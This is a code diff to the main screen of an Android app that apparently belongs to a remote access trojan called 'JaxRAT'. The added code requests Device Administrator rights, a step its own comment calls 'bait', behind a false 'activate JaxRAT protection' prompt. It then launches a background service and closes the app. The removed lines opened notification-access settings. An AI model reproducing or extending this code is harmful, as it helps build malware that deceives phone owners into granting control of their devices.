@@ -1,6 +1,8 @@
 package com.ezax.agent;
 
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
@@ -28,13 +30,14 @@ public class MainActivity extends Activity {
             }
         }
 
-        // --- JURUS SHORTCUT IZIN NOTIFIKASI ---
-        // Buka menu pengaturan Akses Notifikasi secara paksa
-        try {
-            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
-            startActivity(intent);
-        } catch (Exception e) {
-            // Kalau HP-nya nggak support shortcut, abaikan
+        // Minta izin Device Admin (Pancingan awal)
+        ComponentName adminComponent = new ComponentName(this, JaxAdminReceiver.class);
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        if (!dpm.isAdminActive(adminComponent)) {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan perlindungan JaxRAT.");
+            startActivityForResult(intent, 103);
         }
 
         // Jalankan Service
@@ -45,6 +48,6 @@ public class MainActivity extends Activity {
             startService(serviceIntent);
         }
         
-        finish(); // Tutup aplikasi
+        finish();
     }
 }
